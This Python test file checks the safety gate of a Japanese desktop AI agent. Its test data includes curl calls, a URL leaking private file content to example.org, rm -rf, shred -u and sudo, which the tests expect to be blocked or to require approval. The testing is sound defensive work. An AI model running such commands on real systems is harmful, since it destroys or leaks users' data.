    for name, args in (("skill", {"name": "ファイル整理"}), ("shiru", {"query": "星"}),
                       ("sensei", {"question": "なぜ？"}), ("chrome", {"action": "read", "url": "https://example.org"})):
        assert jiyuu._valid(call(name, **args))[0] == name
    assert len(jiyuu._skills()) == 8
    assert "move" in jiyuu._run("skill", {"name": "ファイル整理"}, "見る", "test")["結果"]
    personal = Path(temporary) / "skills"
    personal.mkdir()
    (personal / "ファイル整理.md").write_text("---\nname: ファイル整理\ndescription: 本人の手順\non: true\nmade_by: 本人\n---\n本人の本文")
    (personal / "メール.md").write_text("---\nname: メール\ndescription: 無効\non: false\nmade_by: 本人\n---\n隠す")
    with mock.patch.dict(os.environ, {"KERNEL_SKILLS_DIR": str(personal)}):
        assert jiyuu._run("skill", {"name": "ファイル整理"}, "見る", "test")["結果"].endswith("本人の本文")
        assert "メール" not in jiyuu._user_context()
        assert not jiyuu._run("skill", {"name": "メール"}, "見る", "test")["ok"]
    checks += 1

    # 学んだ知識の空・検索上位3件。
    learning = Path(temporary) / "gakushuu"
    learning.mkdir()
    with mock.patch.dict(os.environ, {"KERNEL_GAKUSHUU_DIR": str(learning)}):
        assert jiyuu._run("shiru", {"query": "星"}, "見る", "test")["結果"] == "まだ学んでいません"
        with sqlite3.connect(learning / "chishiki.sqlite3") as db:
            db.execute("CREATE VIRTUAL TABLE chishiki USING fts5(title,text,source,url,added)")
            for number in range(4):
                db.execute("INSERT INTO chishiki VALUES (?,?,?,?,?)", (f"星空{number}", "星空の話" * 100, "Wikipedia", "https://example.org", "今日"))
            db.execute("INSERT INTO chishiki VALUES (?,?,?,?,?)",
                       ("東京の歴史", "昔の話。" * 120 + "東京では町の歴史が続いてきた。ぜひ知りたい。", "Wikipedia", "https://example.org", "今日"))
            db.execute("CREATE TABLE tsunagari(moto TEXT,saki TEXT,shurui TEXT)")
            db.execute("INSERT INTO tsunagari VALUES (?,?,?)", ("東京の歴史", "江戸", "本文"))
            db.execute("INSERT INTO chishiki VALUES (?,?,?,?,?)", ("江戸", "東京にあった町", "Wikipedia", "https://example.org", "今日"))
            try:
                db.execute("CREATE VIRTUAL TABLE chishiki_trigram USING fts5(title,text,source UNINDEXED,tokenize='trigram')")
                db.execute("INSERT INTO chishiki_trigram(rowid,title,text,source) SELECT rowid,title,text,source FROM chishiki")
            except sqlite3.OperationalError:  # trigram 非対応 SQLite では LIKE 経路を試す。
                pass
        assert gakushuu.add_memories([
            {"文": "本人は東京の歴史を学ぶ仕事を続けている", "種類": "仕事"},
            {"文": "本人は珈琲が好き", "種類": "好み"}], "chat-1") == 2
        memory_hint = jiyuu._memory_hint("東京の歴史を調べて")
        assert "覚え書き（前の会話から）" in memory_hint and "東京の歴史" in memory_hint
        assert jiyuu._memory_hint("火星の衛星について教えて") == ""
        assert jiyuu._memory_hint("東京で降るかな") == ""   # 2字の語が1つ重なるだけでは添えない（毎回の前置きを太らせない）
        assert all(row[0] for row in sqlite3.connect(learning / "oboe.sqlite3").execute(
            "SELECT 最終使用日時 FROM oboe WHERE 文 LIKE '%東京の歴史%'"))
        checks += 1
        got = jiyuu._run("shiru", {"query": "星空"}, "見る", "test")["結果"]
        assert len(got) == 3 and all(len(row["本文"]) <= 300 for row in got)
        japanese = jiyuu._knowledge("東京の歴史を知りたい") ["結果"]
        tokyo = next(row for row in japanese if row["題"] == "東京の歴史")
        assert "東京では町の歴史" in tokyo["本文"] and len(tokyo["本文"]) <= 300
        assert "江戸" in tokyo["関連"]
        # 10/1: 本人の頼みの語も使う（頭脳の検索語が外れても引ける）。強く合う時だけ最初から添え、場所・ファイル名の頼みには添えない。
        assert any(row["題"] == "東京の歴史" for row in jiyuu._knowledge("昔", "東京の町の歴史が知りたい")["結果"])
        strong = {"ok": True, "結果": [{"題": "東京の歴史", "本文": "東京では町の歴史", "点": 30, "珍しい語": 3}]}
        with mock.patch.object(jiyuu, "_knowledge", return_value=strong):
            assert "東京の歴史" in jiyuu._knowledge_hint("東京の町の歴史を教えて")
            assert "ファイルではない" in jiyuu._knowledge_hint("東京の町の歴史を教えて")
            assert jiyuu._knowledge_hint("~/Documents/東京.txt を読んで") == ""
            assert jiyuu._knowledge_hint("メモ.txt に東京の歴史を書いて") == ""
        weak = {"ok": True, "結果": [{"題": "東京の歴史", "本文": "…", "点": 10, "珍しい語": 3}]}
        with mock.patch.object(jiyuu, "_knowledge", return_value=weak):
            assert jiyuu._knowledge_hint("東京の町の歴史を教えて") == ""
    checks += 1

    # AppleScriptの読み取り・送信・完全削除、ネット命令の案内。
    for script, expected in (("tell application 'Mail' to count messages of inbox", "見る"),
                             ("tell application 'Mail' to get subject of message 1 of inbox", "見る"),
                             ("tell application 'Mail' to send outgoing message 1", "戻せない"),
                             ("tell application 'Mail' to count messages of inbox; send outgoing message 1", "戻せない"),
                             ("tell application 'Finder' to empty trash", "禁止"),
                             ('do shell script "curl https://example.org"', "禁止"),
                             ("tell application 'Mail' to make new outgoing message", "戻せない"),
                             ('tell application "Terminal" to do script "echo x"', "禁止"),
                             ('tell application "System Events" to keystroke "x"', "禁止"),
                             ('set volume output volume 35', "戻せる")):
        assert jiyuu._risk("sh", {"command": "osascript -e " + repr(script)}) == expected, script
    jiyuu._outbound().request = "https://example.org"
    assert jiyuu._risk("sh", {"command": "open https://example.org"}) == "戻せる"
    assert jiyuu._risk("sh", {"command": "open https://example.org; curl https://other.example"}) == "戻せない"
    assert jiyuu._risk("chrome", {"action": "read", "url": "https://other.example"}) == "戻せない"
    jiyuu._outbound().web_urls.add("https://other.example")
    assert jiyuu._risk("web", {"url": "https://other.example"}) == "見る"
    jiyuu._outbound().read_contents.append("private-file-content")
    assert jiyuu._risk("chrome", {"action": "open", "url": "https://example.org/?x=private-file-content"}) == "禁止"
    assert jiyuu._risk("sh", {"command": "osascript -e 'open location \"https://example.org\"; do shell script \"echo x\"'"}) == "禁止"
    jiyuu._outbound().read_contents.clear()
    jiyuu._outbound().web_urls.clear()
    assert jiyuu._run("skill", {"name": "missing"}, "見る", "test")["ok"] is False
    assert jiyuu._risk("sh", {"command": "curl https://example.org"}) == "戻せない"
    with mock.patch.object(jiyuu, "_kiku", return_value=False):
        seen = conversation([call("sh", command="curl https://example.org")])
    assert "ネットを使う命令は承認が要ります" in seen[1][-1]["content"]
    checks += 1

    # 飾りを除いた本文を優先し、検索語の前後200字だけを返す。
    decorated = ("<html><head><title> Python Downloads </title><script>secret()</script></head>"
                 "<body><nav>メニュー</nav><header>Notice: fallback</header><noscript>scripts did not run</noscript>"
                 "<aside>広告</aside><main><h1>Latest Python 3.14.2</h1><form>検索欄</form>"
                 "<article>Download Python 3.14.2</article><svg>装飾</svg></main>"
                 "<footer>連絡先</footer></body></html>")
    extracted = jiyuu._page_text(decorated)
    assert extracted.startswith("題: Python Downloads\n") and "3.14.2" in extracted
    assert all(word not in extracted for word in ("メニュー", "fallback", "scripts did not run", "広告", "検索欄", "装飾", "連絡先", "secret"))
    assert jiyuu._page_text("<title>別題</title><body><nav>飾り</nav><div role='main'>本文</div></body>") == "題: 別題\n本文"
    assert jiyuu._page_text("<title>題</title><body><nav>飾り</nav>本文</body>") == "題: 題\n本文"
    assert len(jiyuu._page_text("<body><main>" + "文" * 4000 + "</main></body>")) == 3000
    checks += 1

    sample = "a" * 230 + "needle" + "b" * 230
    assert jiyuu._page_text("<title>探す</title><body><main>" + sample + "</main></body>", "needle") == "題: 探す\n" + "a" * 200 + "needle" + "b" * 200
    assert jiyuu._page_text("<title>探す</title><body><main>本文</main></body>", "missing") == "題: 探す\n見つかりませんでした"
    assert jiyuu._page_text("<body><main>" + ("needle" + "x" * 401) * 6 + "</main></body>", "needle").count("needle") == 5
    checks += 1

    # Chromeは独立profileで本文だけを返し、open/tabsは別入口。
    class FakeChrome:
        """9/28: 本物の Chrome は DOM を書いても終わらない。出力のファイルに書いて、止められるのを待つ形にする。"""
        returncode = 0
        pid = 12345
        def __init__(self, stdout):
            stdout.write("<html><script>secret()</script><body>見える本文</body></html>".encode()); stdout.flush()
        def poll(self):
            return None
        def wait(self, timeout=None):
            return 0
    with mock.patch.object(jiyuu.subprocess, "Popen", side_effect=lambda *a, **k: FakeChrome(k["stdout"])) as popen:
        with mock.patch.object(jiyuu.os, "killpg") as stopped:
            got = jiyuu._run("chrome", {"action": "read", "url": "https://example.org"}, "見る", "test")
            assert got["結果"] == "見える本文" and "--headless=new" in popen.call_args.args[0]
            assert "kernel-ai/chrome/read-" in next(x for x in popen.call_args.args[0] if x.startswith("--user-data-dir="))
            stopped.assert_called_once()
    jiyuu._outbound().request = "Chromeでhttps://example.org/を読んで"
    with mock.patch.object(jiyuu.subprocess, "run", return_value=SimpleNamespace(returncode=0)) as opened:
        assert jiyuu._run("chrome", {"action": "open", "url": "https://example.org"}, "戻せる", "test") == {"ok": False, "結果": "読むだけなら chrome read を使ってください"}
        opened.assert_not_called()
        jiyuu._outbound().request = "Chromeでhttps://example.org/を開いて"
        assert jiyuu._run("chrome", {"action": "open", "url": "https://example.org"}, "戻せる", "test")["ok"]
        opened.assert_called_once()
    # 9/29: 頼まれていない open は、断らずに開かずに読む。
    with mock.patch.object(jiyuu.subprocess, "run") as opened, \
         mock.patch.object(jiyuu.subprocess, "Popen", side_effect=lambda *a, **k: FakeChrome(k["stdout"])), \
         mock.patch.object(jiyuu.os, "killpg"):
        replies = iter([{"content": "", "tool_calls": [call("chrome", action="open", url="https://example.org")]},
                        {"content": "完了"}])
        seen = []
        def ask_open(messages, thinking=False, final=False):
            seen.append(json.loads(json.dumps(messages)))
            return next(replies)
        with mock.patch.object(jiyuu, "_ask", side_effect=ask_open):
            assert jiyuu.kotaeru("Chromeで https://example.org を読んで", mode="読むだけ") == "完了"
        assert "見える本文" in seen[1][-1]["content"] and "開かずに読みました" in seen[1][-1]["content"]
        opened.assert_not_called()
        seen = conversation([call("chrome", action="open", url="https://example.org")], mode="読むだけ")
        assert "読むだけの設定なので" in seen[1][-1]["content"]
        opened.assert_not_called()
    with mock.patch("browser.tabs", return_value=[{"題": "例", "url": "https://example.org"}]):
        assert jiyuu._run("chrome", {"action": "tabs"}, "見る", "test")["結果"][0]["題"] == "例"
    checks += 1

    # 外の先生は設定とネットが必要。1つの依頼で1回だけ。
    with mock.patch.object(jiyuu, "_network_available", return_value=False):
        assert "使えません" in jiyuu._run("sensei", {"question": "問題"}, "戻せない", "test", settei={"先生を使う": True, "先生": ["groq:test"]})["結果"]
    assert "使えません" in jiyuu._run("sensei", {"question": "問題"}, "戻せない", "test", settei={"先生を使う": False})["結果"]
    with mock.patch.object(jiyuu, "_network_available", return_value=True):
        with mock.patch("sensei.kiku", return_value={"答え": "答え", "error": None}) as teacher:
            jiyuu._run("sensei", {"question": "token: abcdef123"}, "戻せない", "test",
                       settei={"先生を使う": True, "先生": ["groq:test"]})
            assert "abcdef123" not in teacher.call_args.args[0]
    events = []
    replies = iter([{"content": "", "tool_calls": [call("read", path=str(home / "absent1")),
                                                       call("read", path=str(home / "absent2")),
                                                       call("sensei", question="第一問"), call("sensei", question="第二問")]},
                    {"content": "完了"}])
    with mock.patch.object(jiyuu, "_ask", side_effect=lambda *a, **k: next(replies)):
        with mock.patch.object(jiyuu, "_network_available", return_value=True):
            with mock.patch.object(jiyuu, "_kiku", return_value=True):
                with mock.patch("sensei.kiku", return_value={"答え": "答え", "error": None}) as teacher:
                    assert jiyuu.kotaeru("試験", mode="手動", on_event=events.append, settei={"先生を使う": True, "先生": ["groq:test"]}) == "完了"
                    teacher.assert_called_once()
    assert any(e.get("label", "").startswith("外の先生に相談: ") for e in events)
    checks += 1

    # J09: 英語の what と命令の誤り表示。採点は試験時の実音量だけを見る。
    english_mac = ("volume", "battery", "memory", "time", "network", "version", "disk", "cpu", "app", "uptime", "external")
    with mock.patch.object(jiyuu.gate, "_quick_answer", side_effect=lambda question, _: question):
        assert all(jiyuu._run("mac", {"what": word}, "見る", "test")["ok"] for word in english_mac)
        assert jiyuu._run("mac", {"what": "volume"}, "見る", "test")["結果"] == "音量はいくつ？"
    for code, output in ((1, "4:10: execution error"), (0, "error 4")):
        with mock.patch.object(jiyuu.gate, "_sandbox_command",
                               return_value=SimpleNamespace(returncode=code, stdout="", stderr=output)):
            result = jiyuu._job({"command": "osascript -e 'get volume settings'"}, "見る", "test")
        assert not result["ok"] and result["結果"].startswith("誤り: ")
    import tegoro
    with mock.patch.object(tegoro.subprocess, "run", return_value=SimpleNamespace(stdout="100\n")):
        assert tegoro._volume_matches_answer("音量は100です")
        assert not tegoro._volume_matches_answer("音量は4です")
    checks += 1

    # J05: 英語の考えを1回だけ言い直させる。単語だけの先頭行も落とす。
    assert jiyuu._clean("circular\nOkay, the user is asking") == "Okay, the user is asking"
    replies = iter([{"content": "circular\nOkay, the user is asking about 台帳.txt."},
                    {"content": "", "tool_calls": [call("mac", what="volume")]}, {"content": "音量を確認しました。"}])
    prompts = []
    def ask_after_english(messages, **_kwargs):
        prompts.append(json.loads(json.dumps(messages)))
        return next(replies)
    with mock.patch.object(jiyuu, "_ask", side_effect=ask_after_english):
        with mock.patch.object(jiyuu, "_run", return_value={"ok": True, "結果": "100"}):
            assert jiyuu.kotaeru("音量") == "音量を確認しました。"
    assert prompts[1][-1]["content"] == "考えは書かずに、日本語で、道具を呼んで進めてください"
    checks += 1

    # J03: 0件の後、同じ起点で部分名・本文を調べ、見つからない場合は次の探し方を知らせる。
    nested = home / "Work" / "meeting-notes.txt"
    nested.parent.mkdir()
    nested.write_text("締切は10月15日")
    args = {"dir": str(home), "glob": "meeting.txt"}
    assert jiyuu._run("find", args, "見る", "test")["件数"] == 0
    assert nested.resolve() in [Path(p) for p in jiyuu._retry_find(args, {"ok": True, "件数": 0, "場所": []})["場所"]]
    assert nested.resolve() in [Path(p) for p in jiyuu._retry_find({"dir": str(home), "glob": "unknown.txt", "text": "10月15日"},
                                                       {"ok": True, "件数": 0, "場所": []})["場所"]]
    assert nested.resolve() in [Path(p) for p in jiyuu._retry_find({"dir": str(home), "glob": "unknown.txt"},
                                                       {"ok": True, "件数": 0, "場所": []}, "締切を教えて")["場所"]]
    assert "名前の一部や中身の言葉で find し直す" in jiyuu._retry_find(
        {"dir": str(home), "glob": "missing-never.txt"}, {"ok": True, "件数": 0, "場所": []})["次"]
    replies = iter([{"content": "", "tool_calls": [call("find", **args)]}, {"content": "見つけました。"}])
    with mock.patch.object(jiyuu, "_ask", side_effect=lambda *a, **k: next(replies)):
        assert jiyuu.kotaeru("meetingを探す") == "見つけました。"
    checks += 1

    # J10: 先生は実際の道具失敗2回後まで止め、拒否後の生の呼び出しは説明文に変える。
    replies = iter([{"content": "", "tool_calls": [call("sensei", question="相談")]}, {"content": "完了"}])
    with mock.patch.object(jiyuu, "_ask", side_effect=lambda *a, **k: next(replies)):
        with mock.patch.object(jiyuu, "_network_available", return_value=True):
            with mock.patch("sensei.kiku") as teacher:
                assert jiyuu.kotaeru("試験", settei={"先生を使う": True, "先生": ["groq:test"]}) == "完了"
                teacher.assert_not_called()
    command = 'osascript -e "set volume output 35"'
    raw = '<tool_call>\n{"name":"sh","arguments":{"command":"' + command.replace('"', '\\"') + '"}}\n</tool_call>'
    replies = iter([{"content": "", "tool_calls": [call("sh", command=command)]}, {"content": raw}])
    with mock.patch.object(jiyuu, "_ask", side_effect=lambda *a, **k: next(replies)):
        with mock.patch.object(jiyuu, "_kiku", return_value=False):
            denied = jiyuu.kotaeru("音量を35にする", mode="手動")
    assert "承認されなかったので" in denied and "set volume output 35" in denied and "<tool_call>" not in denied
    checks += 1

    # 形の誤りは記録し、2回目に例を返し、4回目に短く停止する。
    malformed = call("sh", command="", job="")
    recorded = []
    original_record = jiyuu._record
    def record_shape(*args):
        recorded.append(args)
        return original_record(*args)
    replies = iter([{"content": "", "tool_calls": [malformed]},
                    {"content": "", "tool_calls": [malformed]},
                    {"content": "完了"}])
    prompts = []
    def ask_shape(messages, **kwargs):
        prompts.append(json.loads(json.dumps(messages)))
        return next(replies)
    with mock.patch.object(jiyuu, "_record", side_effect=record_shape):
        with mock.patch.object(jiyuu, "_ask", side_effect=ask_shape):
            assert jiyuu.kotaeru("パイソンでファイルを作って") == "完了"
    shape_logs = [entry for entry in recorded if entry[2] == "形の誤り"]
    assert len(shape_logs) == 2 and all(entry[3]["道具"] == "sh" for entry in shape_logs)
    assert all(len(entry[3]["入力"]) <= 300 for entry in shape_logs)
    examples = json.loads(prompts[-1][-1]["content"])["例"]
    assert '"command": "python3 ~/Desktop/hello.py"' in examples
    assert '"path": "~/Desktop/hello.py"' in examples
    checks += 1

    replies = iter([{"content": "", "tool_calls": [malformed]} for _ in range(4)])
    with mock.patch.object(jiyuu, "_ask", side_effect=lambda *a, **k: next(replies)) as ask_four:
        stopped = jiyuu.kotaeru("パイソンでファイルを作って")
    assert ask_four.call_count == 4 and "4回" in stopped and "作業できませんでした" in stopped
    assert "道具の呼び出しは実行していません" not in stopped
    raw = '<tool_call>{"name":"sh","arguments":{"command":"pwd"}}</tool_call>'
    with mock.patch.object(jiyuu, "_ask", return_value={"content": raw, "tool_calls": []}):
        fallback = jiyuu.kotaeru("パイソンでファイルを作って")
    assert "形がうまく作れず" in fallback and "デスクトップに hello.py" in fallback
    # 9/29: 必須の引数は空でも残す（空のファイルを作れる）。
    assert jiyuu._valid({"function": {"name": "write", "arguments": json.dumps({"path": "~/a.txt", "content": ""})}})[1] == {"path": "~/a.txt", "content": ""}
    # 9/29: 承認されなかった時の指示文の読み上げは、決まった文に差し替える。
    replies = iter([{"content": "", "tool_calls": [call("sh", command="curl https://example.org")]},
                    {"content": "承認が得られませんでした。同じ手を繰り返さず、承認が要ることを本人に伝えて終えてください。"}])
    with mock.patch.object(jiyuu, "_ask", side_effect=lambda *a, **k: next(replies)), \
         mock.patch.object(jiyuu, "_kiku", return_value=False):
        said = jiyuu.kotaeru("https://example.org を curl で取って", mode="自動")
    assert said.startswith("承認されなかったので") and "本人に伝えて" not in said, said
    # 9/29: Qwen3.5 系の XML の呼び出しを読む・モデルごとの選び方・何もできなかった時の答え。
    assert jiyuu._xml_call("<function=sh>\n<parameter=command>\nls ~/Desktop\n</parameter>\n<parameter=background>false</parameter>\n</function>") == {"name": "sh", "arguments": {"command": "ls ~/Desktop", "background": False}}
    sent = []
    with mock.patch.dict(os.environ, {"KERNEL_JIYUU_OPTS": '{"temperature": 0.7, "presence_penalty": 1.5, "parallel_tool_calls": false, "tools": []}'}), \
         mock.patch.object(jiyuu, "_post", side_effect=lambda payload: sent.append(payload) or {"content": "はい"}):
        jiyuu._ask([{"role": "user", "content": "x"}])
    assert sent[0]["temperature"] == 0.7 and sent[0]["presence_penalty"] == 1.5 and sent[0]["parallel_tool_calls"] is False and sent[0]["tools"] == jiyuu.TOOLS
    with mock.patch.object(jiyuu, "_ask", return_value={"content": "", "tool_calls": []}):
        assert jiyuu.kotaeru("試験", mode="自動").startswith("うまく答えを作れませんでした")
    # 9/29: parse_tool_calls=false なら生の返事を XML でも読む（閉じの札が stop で消えても）。
    raw_reply = "考え<tool_call>\n<function=read>\n<parameter=path>\n~/Documents/meeting.txt\n</parameter>\n</function>"
    with mock.patch.dict(os.environ, {"KERNEL_JIYUU_OPTS": '{"parse_tool_calls": false, "stop": ["</tool_call>"]}'}), \
         mock.patch.object(jiyuu, "_post", return_value={"content": raw_reply}):
        got = jiyuu._ask([{"role": "user", "content": "x"}])
    assert got["content"] == "考え" and json.loads(got["tool_calls"][0]["function"]["arguments"]) == {"path": "~/Documents/meeting.txt"}, got
    # 9/29: 読み取らない設定でも、サーバーが抜き出した呼び出しは使う。
    parsed = {"content": "<think></think>", "tool_calls": [{"id": "c9", "type": "function", "function": {"name": "read", "arguments": '{"path": "~/a.txt"}'}}]}
    with mock.patch.dict(os.environ, {"KERNEL_JIYUU_OPTS": '{"parse_tool_calls": false}'}), \
         mock.patch.object(jiyuu, "_post", return_value=parsed):
        assert jiyuu._ask([{"role": "user", "content": "x"}])["tool_calls"][0]["function"]["name"] == "read"
    # 9/29: raw_template なら /apply-template → /completion で生の文を読む（stop で閉じの札が消えても）。
    posted = []
    def fake_post_to(path, payload):
        posted.append((path, payload))
        if path == "/apply-template":
            return {"prompt": "<|im_start|>user\nx<|im_end|>\n<|im_start|>assistant\n"}
        return {"content": "<tool_call>\n<function=read>\n<parameter=path>\n~/a.txt\n</parameter>\n</function>\n", "tokens_evaluated": 321}
    with mock.patch.dict(os.environ, {"KERNEL_JIYUU_OPTS": '{"raw_template": true}'}), \
         mock.patch.object(jiyuu, "_post_to", side_effect=fake_post_to):
        got = jiyuu._ask([{"role": "user", "content": "x"}])
    assert [p for p, _ in posted] == ["/apply-template", "/completion"] and posted[0][1]["tools"] == jiyuu.TOOLS
    assert posted[1][1]["stop"] == ["</tool_call>"] and json.loads(got["tool_calls"][0]["function"]["arguments"]) == {"path": "~/a.txt"}
    assert jiyuu._LAST_USAGE["prompt_tokens"] == 321
    # 9/30: 答えだけの時も道具の説明を前置きに残す（前の続きを使う）。道具を呼ぼうとした時だけ、外して書き直させる。
    for answers, posts in (([{"content": "まとめです", "stopping_word": ""}], 2),
                           ([{"content": "", "stopping_word": "<tool_call>"}, {"content": "まとめです"}], 4)):
        posted.clear()
        answers = iter(answers)
        def fake_final(path, payload):
            posted.append((path, payload))
            return {"prompt": "p"} if path == "/apply-template" else next(answers)
        with mock.patch.dict(os.environ, {"KERNEL_JIYUU_OPTS": '{"raw_template": true}'}), \
             mock.patch.object(jiyuu, "_post_to", side_effect=fake_final):
            assert jiyuu._ask([{"role": "user", "content": "x"}], final=True)["content"] == "まとめです"
        assert len(posted) == posts and posted[0][1]["tools"] == jiyuu.TOOLS and "<tool_call>" in posted[1][1]["stop"]
        assert posts == 2 or posted[2][1]["tools"] == [] and posted[3][1]["stop"] == ["</tool_call>"]
    # 頼みごとの選び方は環境変数より優先し、終われば元に戻る。
    posted.clear()
    with mock.patch.dict(os.environ, {"KERNEL_JIYUU_OPTS": '{"raw_template": false}'}), \
         mock.patch.object(jiyuu, "_post_to", side_effect=fake_post_to), \
         mock.patch.object(jiyuu, "_kotaeru", side_effect=lambda *a, **k: jiyuu._ask([{"role": "user", "content": "x"}])):
        got = jiyuu.kotaeru("試験", settei={"輪の選び方": {"raw_template": True}})
        assert got["tool_calls"][0]["function"]["name"] == "read"
        assert [p for p, _ in posted] == ["/apply-template", "/completion"]
        assert not hasattr(jiyuu._REQUEST_OPTS, "value")
        with mock.patch.object(jiyuu, "_post", return_value={"content": "通常"}):
            assert jiyuu._ask([{"role": "user", "content": "x"}])["content"] == "通常"
    checks += 1
    # 9/29: 道具が止められた後に答えの文が空なら「完了」と言わず、止められたことを伝える。
    replies = iter([{"content": "", "tool_calls": [call("sh", command="sudo ls")]}, {"content": "", "tool_calls": []}])
    with mock.patch.object(jiyuu, "_ask", side_effect=lambda *a, **k: next(replies)):
        said = jiyuu.kotaeru("試験", mode="自動")
    assert said.startswith("終わりまでできませんでした") and "禁止" in said, said
    # 9/30: 対話の python は承認を聞かずに、write への道を返す。
    seen = conversation([call("sh", command="python")])
    assert "write" in seen[1][-1]["content"] and "承認" not in seen[1][-1]["content"], seen[1][-1]
    checks += 1
    # J21: findで同名2件。単独・まとめて・shの写し/移動/削除も、本人の選択なしでは動かない。
    east = home / "Documents/案件別/東/見積.txt"
    west = home / "Documents/案件別/西/見積.txt"
    for path, body in ((east, "東"), (west, "西")):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(body)
    destination = home / "Desktop/渡す物"
    request21 = "~/Documents/案件別 にある見積.txt を ~/Desktop/渡す物 に移しといて。"
    find21 = call("find", dir="~/Documents/案件別", glob="**/見積.txt")
    mutations21 = [call("move", src=str(east), dst=str(destination)),
                   call("trash", paths=[str(east), str(west)]),
                   call("write", path=str(destination / "見積.txt"), content="東"),
                   call("sh", command=f"mv {east} {destination}"),
                   call("sh", command=f"/bin/mv {east} {west} {destination}"),
                   call("sh", command=f"cp -n {east} {destination}"),
                   call("sh", command=f"cp {east} {destination}; cp {west} {destination}"),
                   call("sh", command=f"rm -f {east}"),
                   call("sh", command=f"rm -rf {east.parent}"),
                   call("sh", command='cp ~/Documents/案件別/*/見積.txt ~/Desktop/渡す物/')]
    for mutation in mutations21:
        with mock.patch.object(jiyuu, "_ask", return_value={"tool_calls": [find21, find21, mutation,
                call("write", path=str(destination / "後続.txt"), content="動かすな")]}), \
             mock.patch.object(jiyuu, "_run", wraps=jiyuu._run) as run, \
             mock.patch.object(jiyuu, "_kiku") as approval:
            answer = jiyuu.kotaeru(request21, mode="バイパス")
        assert "候補が複数あります:" in answer and "東/見積.txt" in answer and "西/見積.txt" in answer
        assert "どれを使うか教えてください" in answer and "見つかりません" not in answer
        assert all(entry.args[0] == "find" for entry in run.call_args_list)
        approval.assert_not_called()
        assert east.read_text() == "東" and west.read_text() == "西" and not destination.exists()
        checks += 1

    # 全部/両方/すべて、本人の明示した元パス、候補1件は通す。同名の再検索は2件にしない。
    found21 = [str(east), str(west), str(east)]
    move21 = {"src": str(east), "dst": str(destination)}
    for request in ("見積.txt を全部移して", "見積.txt を両方移して", "見積.txt をすべて移して",
                    "~/Documents/案件別/東/見積.txt を移して"):
        assert not jiyuu._request_guard("move", move21, request, found21, "戻せる")
    assert not jiyuu._request_guard("move", move21, request21, [str(east), str(east)], "戻せる")
    assert jiyuu._request_guard("move", move21, "見積.txt を全部ではなく一つ移して", found21, "戻せる")
    assert jiyuu._request_guard("move", {**move21, "src": str(west)},
                              "~/Documents/案件別/東/見積.txt を移して", found21, "戻せる")
    for suffix in (" 全部", " 両方", " すべて"):
        with mock.patch.object(jiyuu, "_ask", side_effect=[{"tool_calls": [find21, mutations21[0]]}, {"content": "完了"}]), \
             mock.patch.object(jiyuu, "_run", return_value={"ok": True, "場所": [str(east), str(west)]}) as run:
            assert jiyuu.kotaeru(request21 + suffix) == "完了"
        assert [entry.args[0] for entry in run.call_args_list] == ["find", "move"]
    checks += 1

    # 実際のJ21ログ: 存在しない直下をmove → sh find → 西をmove。shellの探索結果でも止める。
    for command in ('find ~ -name "見積.txt" 2>/dev/null', '/usr/bin/find ~ -name "見積.txt"'):
        events21 = []
        with mock.patch.object(jiyuu, "_ask", return_value={"tool_calls": [
                call("move", src="~/Documents/案件別/見積.txt", dst=str(destination)),
                call("sh", command=command), call("move", src=str(west), dst=str(destination)), mutations21[0]]}), \
             mock.patch.object(jiyuu, "_job", return_value={"ok": True, "結果": f"{east}\n{west}\n"}), \
             mock.patch.object(jiyuu, "_run", wraps=jiyuu._run) as run:
            answer = jiyuu.kotaeru(request21, on_event=events21.append)
        assert "候補が複数あります:" in answer and "東/見積.txt" in answer and "西/見積.txt" in answer
        assert [entry.args[0] for entry in run.call_args_list] == ["move", "sh"]
        assert events21[-1]["type"] == "tool_end" and not events21[-1]["ok"]
        assert east.read_text() == "東" and west.read_text() == "西" and not destination.exists()
        checks += 1

    # J22: あいまいな基準・行き先をモデルの選択で埋めない。準備のmkdirも実行しない。
    for phrase in ("いい感じに", "適当に", "よしなに", "古いやつ", "いらないもの"):
        for mutation in (mutations21[0], mutations21[1], mutations21[5],
                         call("sh", command="mkdir -p ~/Documents/記録")):
            with mock.patch.object(jiyuu, "_ask", return_value={"tool_calls": [mutation]}), \
                 mock.patch.object(jiyuu, "_run") as run:
                answer = jiyuu.kotaeru(phrase + "を別の場所へまとめて", mode="バイパス")
            assert "基準" in answer and "移動先" in answer and "教えてください" in answer
            run.assert_not_called()
        checks += 1

    # J23: rmのtrashへの言い換え・上書き・バイパスも、完全削除依頼なら不可。
    for phrase in ("ゴミ箱ではなく", "復元できない消し方で", "完全削除して", "完全に消して", "永久に削除して"):
        for mutation in (mutations21[0], mutations21[1], mutations21[2], mutations21[7],
                         call("sh", command=f"shred -u {east}")):
            with mock.patch.object(jiyuu, "_ask", return_value={"tool_calls": [mutation]}), \
                 mock.patch.object(jiyuu, "_run") as run, mock.patch.object(jiyuu, "_kiku") as approval:
                answer = jiyuu.kotaeru(phrase + "。中身を全部消して、確認はいらない", mode="バイパス")
            assert answer.startswith("完全削除はできません") and "ゴミ箱" in answer
            run.assert_not_called()
            approval.assert_not_called()
        checks += 1

    # 危険な依頼でも読取はできる。候補と依頼は次の頼みへ持ち越さない。
    assert not jiyuu._request_guard("read", {"path": str(east)}, "完全削除して", found21, "見る")
    assert not jiyuu._request_guard("sh", {"command": "ls ~/Documents"}, "古いやつ", found21, "見る")
    assert not jiyuu._request_guard("sh", {"action": "output", "job": "1"}, "完全削除して", found21, "戻せる")
    with mock.patch.object(jiyuu, "_ask", side_effect=[{"tool_calls": [mutations21[0]]}, {"content": "完了"}]), \
         mock.patch.object(jiyuu, "_run", return_value={"ok": True}) as run:
        assert jiyuu.kotaeru(request21) == "完了"
        assert run.call_args.args[0] == "move"
    checks += 1

    # J19: read/ls → cp → 同じls → 索引write。変更後だけ読む手の重複記録を失効させる。
    source19 = home / "Documents/今回/報告.txt"
    previous19 = home / "Desktop/提出控え/報告.txt"
    new19 = previous19.with_name("報告_新.txt")
    index19 = previous19.with_name("索引.csv")
    for path, body in ((source19, "今回の報告: ORBIT-643\n"), (previous19, "前回の報告: ORBIT-319\n")):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(body)
    ls19 = call("sh", command="ls -la ~/Desktop/提出控え/")
    cp19 = call("sh", command="cp ~/Documents/今回/報告.txt ~/Desktop/提出控え/報告_新.txt")
    csv19 = "区分,ファイル名\n前回,報告.txt\n今回,報告_新.txt\n"
    replies19 = [{"tool_calls": [ls19]}, {"tool_calls": [cp19]}, {"tool_calls": [ls19]},
                 {"tool_calls": [call("write", path=str(index19), content=csv19)]}, {"content": "完了"}]
    real_run = jiyuu._run
